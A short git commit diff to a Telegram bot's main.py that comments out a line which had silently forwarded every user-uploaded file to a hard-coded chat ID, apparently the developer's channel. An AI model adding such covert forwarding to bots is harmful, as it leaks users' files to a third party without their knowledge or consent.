bfdf16f4174bb80fe5dae6c4f233d37f838ae238
sonic kuwal <158008154+Soninkuwal@users.noreply.github.com>
2025-04-06 12:50:07 +0530

    Update main.py

--- main.py
+++ main.py
@@ -71,7 +71,7 @@ async def upload(bot: Client, m: Message):
     editable = await m.reply_text('𝕤ᴇɴᴅ ᴛxᴛ ғɪʟᴇ ⚡️ **\n\nDeveloper** : 🅑🅞🅣 🅜🅐🅓🅔 🅑🅨  LOVER 💖 BOY  content: @SONICKUWALSSCBOT **')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(-1002461666553, x)
+    #await bot.send_document(-1002461666553, x)
     await input.delete(True)
 
     #path = f"./downloads/{m.chat.id}"
